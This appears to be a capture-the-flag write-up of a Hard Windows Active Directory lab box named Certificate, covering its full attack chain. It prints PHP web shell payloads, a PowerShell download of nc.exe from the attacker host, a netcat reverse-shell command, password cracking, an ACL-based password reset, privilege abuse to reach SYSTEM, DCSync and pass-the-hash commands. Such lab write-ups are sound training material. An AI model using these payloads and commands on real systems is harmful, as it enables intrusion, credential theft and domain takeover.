@@ -1,0 +1,221 @@
+Description:
+Certificate is a hard windows box requiring advanced knowledge in file upload payloads,
+and windows privileges. While the methods used to gain SYSTEM do work, I suspect
+there are multiple ways to attack this box.
+Difficulty: Hard
+Operating System: Windows Server 2000
+
+
+
+Skills Required:
+   Active Directory
+   Web Exploitation
+   Windows Permissions
+   Password Cracking
+Tools Used:
+  Python
+  Bloodhound
+  netcat
+  evil-winrm
+  impacket
+  NetExec
+  hashcat
+  JohnTheRipper
+  BloodyAD
+
+
+
+Enumeration
+
+Port Scanning - Nmap
+Navigating to the website we can see there is a registration and login page for both
+students and teachers, however the teacher account requires verification. In this case I
+made a student account and logged into it.
+
+
+
+
+Browsing the page we find different courses we can enroll in. Once enrolled you can
+access quizzes where you can submit your work. This seems to be our vector of attack!
+As the website lists we can only upload .pdf, pptx, xlsx and zip files. Lets try to ignore
+this and upload a .php shell and try to access it.
+<?php system($_GET['cmd']); ?>
+This will be our payload.
+
+
+
+
+As show above the website will not allow us to upload files that it detects as malicious
+and it references a MIME type. a MIME (Multipurpose Internet Mail Extensions) type, or
+better known as Media Type is how the website is checking our file type.
+We can hide this by disguising our payload as a .pdf and keeping the .php format by
+using a null byte to separate the file extensions. This cannot be done by had I found so
+below is a simple python script that will allow us to do this.
+
+
+
+
+While this code is called dump (which is a spoiler to a later step) I will soon reference it
+as shell.php. However after generating the payload we get the error once more.
+
+
+
+
+This seemed to be because the payload was using the system() call which was being
+detected. Therefore we need to move to the shell_exec function as a suitable bypass.
+<?php echo(shell_exec($_GET['cmd'])); ?>
+
+
+
+
+We can see with the command whoami we now have shell on the website!
+Upgrading the shell - Netcat
+We then can open up a http server on our attack machine to serve files to the website.
+python3 -m http.server 8000
+After This we can query our netcat payload over via powershell's IWR or Invoke Web
+Request.
+shell.php?cmd=powershell%20-c%20%22iwr%20http://10.10.x.x:8000/nc.exe%20-
+OutFile%20nc.exe%22
+After which we open a netcat listener on the attack machine as well.
+nc -lvnp 4444
+Then query the server to connect with the new binary file.
+shell.php?cmd=.\nc.exe%2010.10.x.x%204444%20-e%20cmd.exe
+
+
+
+
+Now we have a stable CMD shell via netcat!
+
+
+Foothold
+
+User Enumeration
+
+
+
+
+After some digging we can find a interesting file called db.php or the database
+configuration file. This file gives us the database password we can use to login with to
+dump the data base!
+
+
+
+
+As I eluded to earlier we can make a python script to dump the database and organize it
+by user. (NOTE: there is a mssql.exe in these files I just missed it during this step)
+
+
+
+
+Checking the database we can collect all the users bcrypt hashed passwords and crack
+them in hashcat.
+hashcat -m 3200 -a 0 ..\bcrypt_hashes.txt ..\rockyou.txt
+We can then use NetExec to verify the credentials and check if we have Windows
+Remote Management perms, in which we do!
+
+
+Privilege Escalation - SeManageVolumePrivilege
+
+
+
+
+Looking at the users on the machine we see other users like Ryan.K. Here, using
+bloodhound, we can check for vectors to take over these users.
+To collect Bloodhound data I used the following.
+bloodhound-python -u sara.b -p [password] -dc dc01.x.htb -d x.htb -c all
+-ns 10.10.x.x
+
+
+
+
+After importing this data into bloodhound we can see sara.b's group ACCOUNT
+OPERATORS have GenericAll Permission over Ryan.K's account. We can exploit this by
+changing his password using a tool called bloodyAD.
+
+
+
+
+bloodyAD -d domain.htb -u sara.b -p [password] --host 10.x.x.x set
+password Ryan.K [New Password]
+ whoami /priv
+Once logged in we can list Ryan.K's Privilege and see that he has
+ SeManageVolumePrivilege . This permission allows us to change the permission on any
+folder and files within the folder.
+Using the following exploit I attempt this on the root.txt flag in the Administrator's
+Desktop.
+https://github.com/xct/SeManageVolumeAbuse/tree/main
+
+
+.\SeManageVolumeAbuse.exe C:\Users\Administrator\Desktop
+
+
+
+
+As you can see the box creator performed some kind of back magic I could not figure
+out how to reverse on the file. Whatever this was even if I had full access to the file I still
+could not read it.
+That's quite the bummer, but we can still use this privilege to gain SYSTEM access
+through a Living off the Land Binary (LOLBAS) diaghub .
+These can be found at LOLBAS
+The used exploit can be found here Diaghub.
+
+
+
+
+While this is not required, I edited the payload of the exploit and compiled it to use a
+bat file instead. This way I can make my own payload on the fly and see what works.
+
+
+
+
+My plan was to make a new user, and then dump the domain secrets with a DCSync
+attack.
+.\SeManageVolumeAbuse.exe C:\Windows\System32
+
+
+
+
+ diaghub.exe C:\ProgramData xct.dll
+After following the exploit instruction, adding the files to system32 and running it, I was
+able to create this user!
+
+
+
+
+Logging in and running the whoami /priv command verifies the users permission as
+well.
+ secretsdump.py domain.htb/[user]:[password]@domain.htb
+Lastly We dump the secrets and login to the Administrator account using evil-winrm and
+a PTH (Pass the hash) attack.
+ evil-winrm -i 10.x.x.x -u Administrator -H [hash]
+
+
+Wild Goose Chase
+The following are some users that were vulnerable to attack but were not useful in my
+journey to SYSTEM access.
+
+
+
+
+The first thing I found on Sara.b's user account was a pcap file with another users creds.
+This was the output of Network Miner, a quick tool that allows us to pull credentials
+captured in pcap files.
+This hash is a AS-REP hash used for Kerberos Authentication. I had to used john instead
+of hash cat for this hash as the format was not getting accepted / user error which was
+quite time consuming.
+john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
+asrep_hash.txt
+
+
+
+
+This user also has windows remote management but not special permissions. Therefore
+a wild goose chase.
+
+
+
+
+I then later used sara.b again to join the ENTERPRISE READ-ONLY DOMAIN CONTROLLERS
+then try to leverage the GetChanges Permission to the perform a DCSync attack. This
+also failed as the permission are not high enough to perform this action.
+
